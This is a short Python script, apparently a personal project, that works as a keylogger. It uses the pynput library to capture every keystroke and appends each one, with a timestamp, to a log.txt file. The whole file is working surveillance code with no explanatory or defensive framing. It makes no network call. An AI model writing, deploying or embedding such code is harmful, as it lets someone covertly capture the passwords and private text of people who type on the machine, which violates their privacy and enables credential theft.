# pip freeze > requirements.txt
#* -- Imports
import os
from pynput.keyboard import Listener
import logging

#* -- Variables
path = os.path.dirname(__file__) #? Directory path
logging.basicConfig(filename=f"{path}\\..\\log.txt", level=logging.DEBUG, format="[%(asctime)s] %(message)s")

#* -- Functions
def clearConsole() -> None: #? Clear console
    os.system("cls" if os.name == "nt" else "clear")

def logKey(key) -> None: #? Log key
    logging.info(str(key))

def main() -> None:
    with Listener(on_press=logKey) as listener:
        listener.join()

#! Main
if __name__ == "__main__":
    main()
